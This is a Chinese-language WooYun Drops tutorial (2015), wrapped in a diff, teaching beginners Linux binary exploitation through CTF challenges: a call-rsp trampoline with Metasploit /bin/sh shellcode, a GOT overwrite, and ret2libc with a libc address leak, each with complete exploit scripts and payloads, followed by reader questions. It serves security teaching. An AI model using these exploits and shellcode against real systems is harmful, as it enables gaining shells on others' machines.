@@ -1,0 +1,153 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">linux常见漏洞利用技术实践</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">君莫笑</a> <span class="bull">·</span> <time title="2015/06/09 10:03" ui-time="" datetime="2015/06/09 10:03" class="published ng-binding ng-isolate-scope">2015/06/09 10:03</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x01 前言</h1><hr><p><strong><em>1.1 目的</em></strong></p><p>1.1.1 写这篇文章一是总结一下前段时间所学的东西,二是给pwn还没入门的同学一些帮助,毕竟自己学的时候还是遇到不少困难 以下都是我的实际操作,写的比较详细,包含了我自己的一些经验,欢迎大家指点.</p><p>1.1.2 内容包含利用跳板劫持流程,GOT覆写 ,ret2libc等技术</p><p><strong><em>1.2 预备</em></strong></p><p>1.2.1工具</p><p>1.2.1.1 ida</p><p>反汇编神器,下载地址down.52pojie.cn</p><p>1.2.1.2 gdb</p><p>动态调试工具,ubuntu自带,但是自带高版本无法装peda插件.google 搜索downgrade gdb,重新安装低版本gdb即可</p><p>1.2.1.3 pwntools和zio</p><p>两者均是用python开发的exp编写工具,同时方便了远程exp和本地exp的转换 <code>sudo pip install pwntool / sudo pip install zio</code>即可安装</p><p>1.2.1.4 peda</p><p>gdb的一个插件,github上可以下载,增加了很多方便的功能</p><p>1.2.2 预备知识</p><p>1.2.2.1 强烈的兴趣</p><p>1.2.2.2 知道简单的c代码怎样和汇编对应</p><p><a href="http://drops.wooyun.org/wp-content/uploads/2015/06/%E7%A8%8B%E5%BA%8F.zip">附件下载</a></p><h1>0x02 常见漏洞利用技术</h1><hr><p><strong><em>2.1 利用跳板覆盖返回地址</em></strong></p><p>2.1.1 使用范围</p><p>当系统打开ASLR(基本都打开了)时,使用硬编码地址的话,就无法成功利用漏洞.在这种情况下就可以使用这种技术.程序必须关闭NX</p><p>2.1.2 原理</p><p>当函数执行完,弹出了返回地址,rsp往往指向(返回地址+8),我们将shellcode放在此处就可以让程序执行,注意跳板不一定是rsp</p><p>2.1.3 实践</p><p>在这儿用的程序是来自重庆邮电大学举办的cctf2015中pwn的第一题,感谢tracy_子鹏学长(程序见附件),运行环境64位linux</p><p>1 拿到程序第一件事就是先运行一下,熟悉要分析的东西(这一点不光是pwn,不管是re还是渗透,先对于目标有个直观了解都是很重要的事)</p><p><img alt="enter image description here" img-src="b5b432824aa6563d4c27131e542ce706f3d76199.jpg"></p><p>程序很简单,就是一个简单的接受输入</p><p>2 打开ida,,可以看到程序非常的简单</p><pre><code>#!c++
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __int64 v3; // <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7e0c1a063e4f">[email&#160;protected]</a>
+  char v5; // [sp+0h] [bp-1020h]@1
+  char v6; // [sp+1000h] [bp-20h]@1
+  int v7; // [sp+101Ch] [bp-4h]@1
+
+  setbuf(stdin, 0LL, envp);
+  setbuf(stdout, 0LL, v3);
+  puts(0x4938E4LL);
+  v7 = read(0LL, &amp;v5, 4096LL);
+  return memcpy(&amp;v6, &amp;v5, v7);
+}
+</code></pre><p>我们输入的数据最终会复制到[bp-20h],而且没有长度限制,肯定就是有栈溢出漏洞</p><p>3 接下来我们检查一下程序打开了哪些保护措施</p><p><img alt="enter image description here" img-src="93ca2b59f5b3ffee030e11c1da6d198f83e2e4a9.jpg"></p><pre><code>gdb pwn1
+checksec
+</code></pre><p>可以看到程序没有没有打开任何保护措施,现在唯一需要解决的就是系统自带的ASLR,(注意,使用gdb调试时,每次看到的栈地址可能是不变的,这并不代表系统没有打开ASLR,gdb调试时会自动关闭ASLR)</p><p>4 接下来是定位返回地址</p><p>前面看到了我们输入的数据最终会复制到[bp-20h],我们先尝试输入40个数据,用python生成40个数据</p><p><img alt="enter image description here" img-src="b6c0f41c540b1e41da8919c3dcf5a6e46bf3fdcc.jpg"></p><pre><code>gdb pwn1
+r           //运行程序
+</code></pre><p>复制生成的输入进去</p><p><img alt="enter image description here" img-src="b47b0b611cdb054c94dfaa957be3968ac0841bbc.jpg"></p><p>看到栈上没有成功覆盖发挥地址</p><p><img alt="enter image description here" img-src="b1dcf4f750801d0ca12b673dc08ef5bb6d2604d5.jpg"></p><p>再次使用八十字节</p><p><img alt="enter image description here" img-src="84abdf8a81bead25c083fd4c31c0ebb3f3d234a6.jpg"></p><p>可以看出从第四十个字节开始的八个字节就会覆盖返回地址</p><p>5 写exp</p><p>首先我们需要一个shellcode,这可以通过msf生成 生成命令如下</p><pre><code>#!bash
+show payload   
+use linux/x64/exec
+set cmd /bin/sh
+generate -t py -b "/x00"
+</code></pre><p>即可得到shellcode</p><pre><code>#!bash
+# linux/x64/exec - 87 bytes
+# http://www.metasploit.com
+# Encoder: x64/xor
+# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
+# PrependSetreuid=false, PrependSetuid=false, 
+# PrependSetresgid=false, PrependSetregid=false, 
+# PrependSetgid=false, PrependChrootBreak=false, 
+# AppendExit=false, CMD=/bin/sh
+buf =  ""
+buf += "\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
+buf += "\xef\xff\xff\xff\x48\xbb\xab\xb5\xd9\xba\x45\x0a\xfd"
+buf += "\x44\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
+buf += "\xc1\x8e\x81\x23\x0d\xb1\xd2\x26\xc2\xdb\xf6\xc9\x2d"
+buf += "\x0a\xae\x0c\x22\x52\xb1\x97\x26\x0a\xfd\x0c\x22\x53"
+buf += "\x8b\x52\x4d\x0a\xfd\x44\x84\xd7\xb0\xd4\x6a\x79\x95"
+buf += "\x44\xfd\xe2\x91\x33\xa3\x05\xf8\x44"
+</code></pre><p>然后我们还需要一个跳板作为返回地址 peda就有这种功能</p><pre><code>jmpcall rsp
+</code></pre><p><img alt="enter image description here" img-src="e867211b329db5e53e284f17d4312df68aecfc78.jpg"></p><p>我们就采用第一个地址, 注意64位系统,和little endian</p><p>然后我们使用zio写exp</p><pre><code>#!python
+from zio import *
+
+io = zio('./pwn1')
+# io = zio(('127.0.0.1', 1234))
+
+io.read_until('overflow!')
+
+pad = 'a' * 40
+
+# 0x 43 68 7d : call rsp
+jmpAddr = '\x7d\x68\x43\x00\x00\x00\x00\x00'
+
+shellcode =  ""
+shellcode += "\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
+shellcode += "\xef\xff\xff\xff\x48\xbb\xab\xb5\xd9\xba\x45\x0a\xfd"
+shellcode += "\x44\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
+shellcode += "\xc1\x8e\x81\x23\x0d\xb1\xd2\x26\xc2\xdb\xf6\xc9\x2d"
+shellcode += "\x0a\xae\x0c\x22\x52\xb1\x97\x26\x0a\xfd\x0c\x22\x53"
+shellcode += "\x8b\x52\x4d\x0a\xfd\x44\x84\xd7\xb0\xd4\x6a\x79\x95"
+shellcode += "\x44\xfd\xe2\x91\x33\xa3\x05\xf8\x44"
+
+io.write(pad + jmpAddr + shellcode)
+
+io.interact()
+</code></pre><p><code>python pwn1.py</code>运行即可看到</p><p>已拿到shell</p><p><img alt="enter image description here" img-src="5ef3f9661008e9370fc3f85bc81ade01503585b2.jpg"></p><p><strong><em>2.2 GOT覆写</em></strong></p><p>2.2.1 使用范围</p><p>刚才我们是通过栈溢出漏洞攻击函数的返回地址,但是现在对于栈溢出,已经有很多保护,例如canary(与windows下的GS技术类似).同时现在更常见的是指针覆盖漏洞,在这种情况下我们拥有一次修改任意内存的机会,在这时我们采用的往往就是GOT覆写技术.</p><p>2.2.2 原理</p><p>GOT是全局偏移表,类似于windows中PE结构的IAT,只不过windows中IAT中的函数地址是写保护的,没办法利用,但是GOT是可写的,我们可以将其中的函数地址覆盖为我们的shellcode地址,在程序后面调用这个函数时就会调用我们的shellcode了</p><p>2.2.3 实践</p><p>在这儿我用的实验程序来自panable.kr中的passcode,比较简单,源码如下</p><pre><code>#!c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void login(){
+    int passcode1;
+    int passcode2;
+
+    printf("enter passcode1 : ");
+    scanf("%d", passcode1);
+    fflush(stdin);
+
+    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+    printf("enter passcode2 : ");
+        scanf("%d", passcode2);
+
+    printf("checking...\n");
+    if(passcode1==338150 &amp;&amp; passcode2==13371337){
+                printf("Login OK!\n");
+                system("/bin/cat flag");
+        }
+        else{
+                printf("Login Failed!\n");
+        exit(0);
+        }
+}
+
+void welcome(){
+    char name[100];
+    printf("enter you name : ");
+    scanf("%100s", name);
+    printf("Welcome %s!\n", name);
+}
+
+int main(){
+    printf("Toddler's Secure Login System 1.0 beta.\n");
+
+    welcome();
+    login();
+
+    // something after login...
+    printf("Now I can safely trust you that you have credential :)\n");
+    return 0;   
+}
+</code></pre><p>编译后的程序见附件,32位 linux</p><p>感觉锐锐_z的指点</p><p>1 分析程序可知,scanf时,没有用取地址符,会使用栈上的数据作为指针存放输入的数据,而我们第一次输入的数据就是在栈上,简单调试可知,在welcome()函数中的name的最后4字节会在login()函数中被用作地址指针</p><p>2 这样,我们就获得了修改任意地址数据的一次机会</p><p>3 分析程序可知如果我们用后面调用system()的地址覆盖了printf()在GOT中的指针,那么在第二次login()中第二次调用printf()时就会直接去调用system()</p><p>4 现在我们需要知道两个东西,一是GOT中printf()的地址,二是程序中调用system()的地址</p><pre><code>objdump -R passcode
+</code></pre><p><img alt="enter image description here" img-src="6eb1f4e305b72044e673139cd4c8fa44af96b70f.jpg"></p><p>即可获得<code>printf()</code>在的地址<code>0804a000</code>这是攻击目标,</p><p>然后打开gdb,运行到调用system()的地方,为什么我们可以直接使用这个地址呢,因为linux下面的程序默认没有随机化code段,</p><p><img alt="enter image description here" img-src="83f34ac92568a25f2a597ab1cc28f5798108d06d.jpg"></p><p>要写入的值即为 <code>0x080485e3</code></p><p>5 最后得到</p><pre><code>#!bash
+python -c "print('a'*96+'\x00\xa0\x04\x08'+'\n'+'134514147\n')" | ./passcode
+</code></pre><p><code>134514147</code>即为<code>0x080485e3</code></p><p><img alt="enter image description here" img-src="88e3987845a1268ae45e9a3d882c271eef7bd667.jpg"></p><p>成功改变了程序流程,读出flag文件的内容,注意这里需要你新建一个名叫flag的文件</p><p><strong><em>2.3 ret2libc技术</em></strong></p><p>2.3.1 使用范围</p><p>当系统打开DEP时,我们不能自己直接在栈上放shellcode,就使用几乎每个linux系统都会自带的libc中的代码.</p><p>2.3.2 原理</p><p>一种常见的利用方式是用libc中的system()的地址覆盖返回地址,同时在栈上布置好的参数,程序返回时就会产生一个shell</p><p>2.3.3 实践</p><p>在这儿用的程序是强网杯的urldecoder(程序见附件),再次感谢tracy_子鹏学长指点</p><p>这道题同时开了ASLR和DEP.,运行环境为32位linux</p><ol><li>分析程序后发现,前面读入数据时,只有遇到换行和EOF才会结束,但是后面检查字符串长度是用的strlen,于是可以通过在字符串中加入\x00来绕过长度检查</li><li>继续分析程序流程,发现,当输入为%1\x00时就可以成功覆盖返回地址</li><li>接下来就考虑利用漏洞的方法</li><li>观察到溢出后,程序会多输出一些栈上的数据出来,想到可以利用输出出来的一些数据定位libc加载的基址,然后将返回地址覆盖为前面读入数据的代码地址,再读一次数据,再溢出一次,这一次执行到返回时,就执行libc中的system函数</li><li>题目提供了libc,可以计算其中各函数的偏移,找到libc中system函数和/bin/sh字符串的地址,同时在栈上布置好参数,即可成功利用</li></ol><p>下面附上exp及解释</p><pre><code>#!python
+from pwn import *
+from zio import *
+
+context(arch = 'i386', os = 'linux')
+
+#注意此处ELF()的用处是后面计算偏移,你运行程序时还是用的当前系统的libc
+#libc = ELF('./libc.so.6.i386')
+libc = ELF('/lib/i386-linux-gnu/i686/cmov/libc.so.6')
+
+#p = remote('119.254.101.197', 10001)
+p = process('./urldecoder')
+
+#第一次输入,获取libc中的地址信息
+ret_addr = '\x90\x85\x04\x08'
+payload = "http://baidu.com//%1" + "\x00" + "a"*137 + ret_addr
+
+p.recvuntil("URL:")
+p.send(payload + '\n')
+
+data = p.recvuntil("URL:")
+base_addr = data[196:200]
+
+printf_addr = l32(base_addr) - 0x117474
+
+offset = libc.symbols['printf'] - libc.symbols['system']
+system_addr = printf_addr - offset
+
+binsh_offset = next(libc.search('/bin/sh')) - libc.symbols['printf']
+binsh_addr = binsh_offset + printf_addr
+
+#第二次输入
+ret_addr = '\x12\x12\x12\x12'
+payload = "http://baidu.com//%1" + "\x00" +  "a"*137 + l32(system_addr) + ret_addr +  l32(binsh_addr)
+
+p.send(payload + '\n')
+p.interactive()
+</code></pre><p>run</p><pre><code>#!bash
+python url.py
+</code></pre><p>成功利用</p><p><img alt="enter image description here" img-src="44e7ecb98eb1c7d3f68a78d25f6cc5fdabaf6a46.jpg"></p><p>从中也可以看到,对于同时开了ASLR和DEP的程序,利用的难度确实高了不少</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20141225164032387e6753d7744bf9c1c9b81a2982f65c.jpg" style="width:200px;height:200px"></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/1621" rel="bookmark" id="re1">堆溢出学习笔记</a></li><li><a href="http://drops.wooyun.org/binary/7714" rel="bookmark" id="re2">格式化字符串漏洞简介</a></li><li><a href="http://drops.wooyun.org/tips/3170" rel="bookmark" id="re3">ISG2014 Writeups</a></li><li><a href="http://drops.wooyun.org/binary/7452" rel="bookmark" id="re4">逆向基础 OS-specific (三)</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Dracul</span> <span class="reply-time">2016-02-25 09:55:29</span></div><p></p><p>谢谢分享。请问第一个例子的rsp寄存器保存的是return后栈帧空间的栈顶地址么？0x 43 68 7d 就是call rsp这条指令还是rsp保存的地址？能不能给个联系方式私聊下，有几个地方不太明白，我是新手</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">苏权</span> <span class="reply-time">2016-01-27 11:53:59</span></div><p></p><p>先收藏，虽然实质和windows上差不多，但还是linux安全的新手</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Alittle</span> <span class="reply-time">2015-11-06 21:58:50</span></div><p></p><p>请教一下，最后那个ROP的，<br>ret_addr = &#039;\x90\x85\x04\x08&#039; #求问这个地址是怎么算出来的？<br>另外请问<br>payload = &quot;http://baidu.com//%1&quot; + &quot;\x00&quot; + &quot;a&quot;*137 + ret_addr<br>这个地方的溢出点是怎么得到的呢，也就是中间的a的个数为啥是137个，用脚本检验还是调试程序得到的？<br>还有就是为什么能肯定data[196:200]就一定是libc的基址呢？</p><p>刚刚接触不久这个，还不是很熟，前面的理解了，但是最后那个ROP有点没理解，恳请解答，谢谢啦</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">君莫笑</span> <span class="reply-time">2015-10-24 19:53:55</span></div><p></p><p>@神游 peda自带</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">loveooo</span> <span class="reply-time">2015-10-23 11:34:56</span></div><p></p><p>好东东，想往这方面走</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">神游</span> <span class="reply-time">2015-10-20 20:47:03</span></div><p></p><p>这里的查看软件保护 checksec 我怎么用不了？ 是自己写程序么？，求放</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Rainism</span> <span class="reply-time">2015-06-12 16:48:22</span></div><p></p><p>不错的东东，从来不搞二进制的都看懂了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">君莫笑</span> <span class="reply-time">2015-06-09 16:45:41</span></div><p></p><p>@_Evil ,,,,确实很简单</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2015-06-09 16:29:07</span></div><p></p><p>我也是醉了</p><p></p></div></div></div></div></div></main>
